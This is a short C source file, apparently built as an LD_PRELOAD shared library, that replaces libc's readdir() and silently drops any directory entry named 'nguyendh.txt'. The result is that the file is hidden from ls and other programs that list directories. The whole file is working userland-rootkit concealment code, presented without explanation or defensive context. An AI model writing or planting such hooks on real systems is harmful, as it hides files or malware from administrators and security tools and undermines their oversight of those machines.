#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>


typedef struct dirent* (*readdirOriginal)(DIR *dirp);
 

struct dirent *readdir(DIR *dirp){
    static readdirOriginal original_readdir = NULL;
    if (original_readdir == NULL) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!original_readdir) {
            perror("dlsym");
        }
    }
    struct dirent *entry;
    while ((entry = original_readdir(dirp))) {
        if(strcmp(entry->d_name, "nguyendh.txt") != 0){
           return entry;
        }
    }
    return NULL;

}